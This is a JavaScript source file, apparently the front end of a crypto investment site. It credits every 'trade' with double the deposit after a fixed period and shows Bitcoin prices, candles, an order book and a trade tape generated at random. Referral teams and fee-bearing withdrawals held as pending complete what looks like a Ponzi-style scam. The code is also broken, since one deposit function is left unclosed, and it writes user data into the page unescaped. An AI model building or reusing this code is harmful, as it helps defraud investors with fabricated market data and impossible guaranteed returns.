function currentUser(){const s=sess();return s&&s.email?users()[s.email]||null:null;}
function persistUser(u){const all=users();all[u.email]=u;saveUsers(all);}
function enterDash(){if(!currentUser()){logout();return;}document.getElementById("auth-wrap").classList.add("hidden");document.getElementById("dash-wrap").classList.remove("hidden");drawUser();openTab("home");if(window._t)clearInterval(window._t);window._t=setInterval(function(){if(currentUser())drawUser();},1000);}
function planFor(amt){if(amt>=100)return{label:"10 Days",hours:240};if(amt>=50)return{label:"72 Hours",hours:72};return{label:"24 Hours",hours:24};}
function fmtLeft(ms){if(ms<=0)return"00:00:00";const s=Math.floor(ms/1000),d=Math.floor(s/86400),h=Math.floor((s%86400)/3600),m=Math.floor((s%3600)/60),sec=s%60,p=function(n){return String(n).padStart(2,"0");};return(d?d+"d ":"")+p(h)+":"+p(m)+":"+p(sec);}
function endTrade(u){
if(!u||!u.trade||u.trade.paid)return;
if(Date.now()>=u.trade.end){
const inv=Number(u.trade.amount)||0;
u.balance=inv*2;
u.profit=Number(u.profit||0)+inv*2;
u.trade.paid=true;
persistUser(u);
}
}
function refLink(){const u=currentUser();return u?location.origin+"/?ref="+encodeURIComponent(u.refCode):location.origin+"/";}
function copyRefLink(){navigator.clipboard.writeText(refLink());pop("Copied","Referral link copied");}
function openTradeBox(){
const u=currentUser();if(!u)return;
if(u.trade&&!u.trade.paid){pop("Trade","A trade is already running");return;}
if(Number(u.balance||0)<=0){pop("Trade","Deposit required");return;}
document.getElementById("trade-amt-show").textContent=Number(u.balance).toFixed(2);
document.getElementById("trade-box").classList.remove("hidden");
}
function closeTradeBox(){document.getElementById("trade-box").classList.add("hidden");}
function startTrade(){
const u=currentUser();if(!u)return;
const amt=Number(u.balance||0);if(amt<=0){closeTradeBox();return;}
const plan=planFor(amt);
u.trade={amount:amt,start:Date.now(),end:Date.now()+plan.hours*3600*1000,hours:plan.hours,label:plan.label,paid:false};
persistUser(u);closeTradeBox();drawUser();pop("Trade Successful","Full wallet $"+amt.toFixed(2)+" is now in trade.");
}
function drawUser(){
const u=currentUser();if(!u)return;endTrade(u);
document.getElementById("bal").textContent=Number(u.balance||0).toFixed(2);
document.getElementById("team-size").textContent=(u.team&&u.team.length)||0;
document.getElementById("ref-bonus").textContent=Number(u.refBonus||0).toFixed(2);
document.getElementById("ref-code").textContent=u.refCode;
const rl=document.getElementById("ref-link");if(rl)rl.textContent=refLink();
const pf=Number(u.profit||0).toFixed(2);
const ph=document.getElementById("profit-home");if(ph)ph.textContent=pf;
const pt=document.getElementById("profit-total");if(pt)pt.textContent=pf;
const tleft=document.getElementById("trade-left");
if(tleft)tleft.textContent=(u.trade&&!u.trade.paid)?fmtLeft(u.trade.end-Date.now()):"—";
const bars=document.getElementById("plan-bars");
if(bars){
let html="";
if(u.trade&&!u.trade.paid)html+='<div class="py-2">Trade $'+u.trade.amount+' · '+u.trade.label+' · '+fmtLeft(u.trade.end-Date.now())+"</div>";
(u.deposits||[]).forEach(function(d){html+='<div class="py-2">Deposit $'+d.amount+" · "+depLabel(d)+"</div>";});
bars.innerHTML=html;
}
const pl=document.getElementById("profit-list");
if(pl)pl.innerHTML=(u.trade?'<div class="py-2">Trade $'+u.trade.amount+(u.trade.paid?" · Completed":" · Running")+"</div>":"");
const h=document.getElementById("dep-hist");
if(h)h.innerHTML=(u.deposits||[]).map(function(d){return '<div class="py-2">$'+d.amount+" · "+depLabel(d)+"</div>";}).join("")||"";
const tml=document.getElementById("team-list");if(tml){const mem=u.team||[];tml.innerHTML=mem.map(function(m,i){return '<div class="py-2">'+(i+1)+". "+m.username+" · "+m.email+"</div>";}).join("")||"";}
const s=document.getElementById("wd-saved");if(s)s.textContent=u.wdAddress||"Not added";
const wh=document.getElementById("wd-hist");
if(wh)wh.innerHTML=wds().filter(function(w){return w.email===u.email;}).map(function(w){return '<div class="py-2">$'+w.amount+" · "+wdLabel(w)+"</div>";}).join("")||"";
}
function openTab(id){["home","plans","deposit","trade","profit","withdraw","team"].forEach(function(t){document.getElementById("tab-"+t).classList.toggle("hidden",t!==id);});document.querySelectorAll(".tab-btn").forEach(function(b){b.classList.toggle("gold-border",b.getAttribute("data-tab")===id);b.classList.toggle("text-nx-gold",b.getAttribute("data-tab")===id);});}

function submitHash(){
const u=currentUser(),amt=Number(document.getElementById("dep-amt").value),hash=document.getElementById("dep-hash").value.trim();
if(!amt||amt<20){pop("Error","Minimum $20");return;}
if(hash.length<10){pop("Error","Enter transaction hash");return;}

u.deposits.unshift({amount:amt,hash:hash,time:new Date().toLocaleString(),status:"PENDING"});

function saveAddr(){const u=currentUser(),a=document.getElementById("wd-addr").value.trim();if(a.indexOf("0x")!==0||a.length<20){pop("Error","Enter BEP20 address");return;}u.wdAddress=a;persistUser(u);drawUser();pop("Saved","");}
function calcFee(){const amt=Number(document.getElementById("wd-amt").value)||0;document.getElementById("wd-fee").textContent=(amt*0.05).toFixed(2);document.getElementById("wd-net").textContent=(amt*0.95).toFixed(2);}
function requestWd(){
const u=currentUser();if(!u.wdAddress){pop("Error","Add address");return;}
if(u.trade&&!u.trade.paid){pop("Error","Trade is running");return;}
const amt=Number(document.getElementById("wd-amt").value);
if(!amt||amt>Number(u.balance||0)){pop("Error","Check amount");return;}
const fee=+(amt*0.05).toFixed(2),net=+(amt*0.95).toFixed(2);
u.balance=Number(u.balance)-amt;persistUser(u);
const all=wds();all.unshift({user:u.username,email:u.email,amount:amt,fee:fee,net:net,address:u.wdAddress,status:"PENDING",time:new Date().toLocaleString()});
saveWds(all);document.getElementById("wd-amt").value="";calcFee();drawUser();popSpin();
}
function pop(t,m){document.getElementById("pop-spin").classList.add("hidden");document.getElementById("pop-title").textContent=t;document.getElementById("pop-msg").textContent=m||"";document.getElementById("pop-ok").classList.remove("hidden");document.getElementById("popup").classList.remove("hidden");}
function popSpin(){document.getElementById("pop-spin").classList.remove("hidden");document.getElementById("pop-title").textContent="";document.getElementById("pop-msg").textContent="";document.getElementById("pop-ok").classList.add("hidden");document.getElementById("popup").classList.remove("hidden");setTimeout(closePop,1600);}
function closePop(){document.getElementById("popup").classList.add("hidden");}
function seedCandles(){candles=[];let p=67880;for(let i=0;i<48;i++){const o=p;const drift=(Math.random()-0.48)*28+(Math.random()>0.93?(Math.random()-0.5)*80:0);const c=Math.max(65000,Math.min(71000,o+drift));const h=Math.max(o,c)+Math.random()*18;const l=Math.min(o,c)-Math.random()*18;candles.push({o:o,h:h,l:l,c:c});p=c;}px=candles[candles.length-1].c;}
function drawOHLC(el){if(!el||!candles.length)return;el.innerHTML="";const hi=Math.max.apply(null,candles.map(function(k){return k.h;}));const lo=Math.min.apply(null,candles.map(function(k){return k.l;}));const span=hi-lo||1;candles.forEach(function(k){const col=document.createElement("div");col.className="candle-col";const color=k.c>=k.o?"#3ddc84":"#ff5d6c";const topPad=((hi-k.h)/span)*100,wickH=((k.h-k.l)/span)*100,bodyTop=((k.h-Math.max(k.o,k.c))/span)*100,bodyH=Math.max(1.5,(Math.abs(k.c-k.o)/span)*100);col.innerHTML='<div style="height:'+topPad+'%"></div><div class="wick" style="height:'+wickH+'%;background:'+color+'"></div>';const wrap=document.createElement("div");wrap.style.cssText="width:100%;display:flex;justify-content:center;margin-top:-"+wickH+"%;height:"+wickH+"%;position:relative;";const body=document.createElement("div");body.className="body";body.style.cssText="position:absolute;top:"+(bodyTop/wickH*100)+"%;height:"+Math.max(6,bodyH/wickH*100)+"%;background:"+color;wrap.appendChild(body);col.appendChild(wrap);el.appendChild(col);});}
function fmt(n){return Number(n).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2});}
function tickBook(){const a=document.getElementById("asks"),b=document.getElementById("bids");if(!a)return;let A="",B="";for(let i=8;i>=1;i--){const p=px+i*0.42+Math.random()*0.12;const sz=(Math.random()*0.85+0.02).toFixed(4);A+='<div class="ob-row" style="color:#ff5d6c"><span>'+fmt(p)+'</span><span>'+sz+'</span></div>';}
for(let i=1;i<=8;i++){const p=px-i*0.41-Math.random()*0.12;const sz=(Math.random()*0.85+0.02).toFixed(4);B+='<div class="ob-row" style="color:#3ddc84"><span>'+fmt(p)+'</span><span>'+sz+'</span></div>';}
a.innerHTML=A;b.innerHTML=B;const sp=document.getElementById("spread");if(sp)sp.textContent="spread "+(0.38+Math.random()*0.25).toFixed(2);}
function tickTape(){const side=Math.random()>0.47?"BUY":"SELL";const t=new Date().toTimeString().slice(0,8);tape.unshift({side:side,px:px.toFixed(2),sz:(Math.random()*0.31+0.01).toFixed(4),t:t});if(tape.length>9)tape.pop();
const el=document.getElementById("tape");if(el)el.innerHTML=tape.map(function(r){return '<div class="tape-row"><span style="color:'+(r.side==="BUY"?"#3ddc84":"#ff5d6c")+'">'+r.side+'</span><span>'+r.px+'</span><span>'+r.sz+'</span><span class="text-amber-100/40">'+r.t+'</span></div>';}).join("");}
function tickMarket(){
if(!candles.length)seedCandles();
const last=candles[candles.length-1];
const step=(Math.random()-0.5)*6+(Math.random()>0.96?(Math.random()-0.5)*35:0);
const c=Math.max(65200,Math.min(70800,last.c+step));
last.c=c;last.h=Math.max(last.h,c+Math.random()*4);last.l=Math.min(last.l,c-Math.random()*4);
if(Math.random()>0.62){candles.push({o:c,h:c+Math.random()*7,l:c-Math.random()*7,c:c});if(candles.length>48)candles.shift();}
px=c;volBase+= (Math.random()-0.45)*0.8;
const up=px>=openPx,pt=fmt(px),chg=((px-openPx)/openPx*100);
const hero=document.getElementById("hero-btc");if(hero){hero.textContent=pt;hero.className=(up?"tick-up":"tick-down")+" font-mono";}
const hp=document.getElementById("home-px");if(hp){hp.textContent=pt;hp.className=(up?"tick-up":"tick-down")+" font-mono";}
const hc=document.getElementById("home-chg");if(hc){hc.textContent=(up?"+":"")+chg.toFixed(2)+"%";hc.className=up?"tick-up":"tick-down";}
const hv=document.getElementById("home-vol");if(hv)hv.textContent=volBase.toFixed(2);
const tp=document.getElementById("trade-price");if(tp){tp.textContent=pt;tp.className=(up?"tick-up":"tick-down")+" font-semibold text-2xl font-mono";}
const mk=document.getElementById("mark-px");if(mk)mk.textContent=fmt(px-0.31);
const ls=document.getElementById("last-px");if(ls)ls.textContent=pt;
const ch=document.getElementById("chg");if(ch){ch.textContent=(up?"+":"")+chg.toFixed(2)+"%";ch.className=up?"tick-up":"tick-down";}
const vol=document.getElementById("vol24");if(vol)vol.textContent=volBase.toFixed(2)+" BTC";
drawOHLC(document.getElementById("hero-chart"));drawOHLC(document.getElementById("dash-chart"));drawOHLC(document.getElementById("trade-chart"));tickBook();if(Math.random()>0.25)tickTape();
}

const q=new URLSearchParams(location.search).get("ref");
if(q){const box=document.getElementById("su-ref");if(box){box.value=q;box.readOnly=true;}showScreen("signup");}
